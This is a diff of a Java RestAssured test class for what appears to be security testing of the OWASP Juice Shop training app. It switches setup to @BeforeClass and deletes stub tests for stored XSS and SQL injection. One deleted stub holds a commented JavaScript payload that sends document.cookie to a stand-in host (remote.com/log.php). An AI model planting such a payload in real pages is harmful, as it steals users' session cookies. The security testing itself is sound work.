@@ -4,6 +4,7 @@ import io.restassured.response.Response;
 import org.hamcrest.Matchers;
 import org.junit.Assert;
 import org.junit.Before;
+import org.junit.BeforeClass;
 import org.junit.Test;
 
 import java.io.IOException;
@@ -25,7 +26,7 @@ public class JuiceShop {
     private String password;
     private String loginPath = "/user/login";
 
-    @Before
+    @BeforeClass
     //NOTE: Load Properties (set URL, Port, Proxy, Admin-Login)
     public void initTarget() throws IOException {
 
@@ -151,27 +152,6 @@ public class JuiceShop {
     }
 
     @Test
-    //NOTE: Opens a server socket and waits for XSS3 Payload to connect (execution validation)
-    public void xSS_Stored_Payload_Executed_Tier3() {
-
-
-
-        //Payload (Sending cookies to remote server)
-        /*
-        if (document.cookie !== null) {
-            new Image().src = 'http://remote.com/log.php?localStorage='+escape(document.cookie);
-        }
-        */
-
-    }
-
-    @Test
-    //NOTE: Opens a server socket and waits for XSS4 Payload to connect (execution validation)
-    public void xSS_Stored_Nested_Payload_Executed_Tier4() {
-
-    }
-
-    @Test
     //NOTE: No Content-Type header at all. 401/406 expected.
     //TODO: rest-assured always adds a content-type header (text/plain)
     public void noContenttypeHeader(){
@@ -243,13 +223,5 @@ public class JuiceShop {
             Assert.fail("Security-Header \"X-Frame-Options: SAMEORIGIN\" not found.");
         }
     }
-
-    @Test
-    //NOTE: SQLi
-    public void sQLi() {
-        //GET /rest/product/search?q=undefined
-        //injecting in q; payload in "undefined";
-    }
-
 
 }
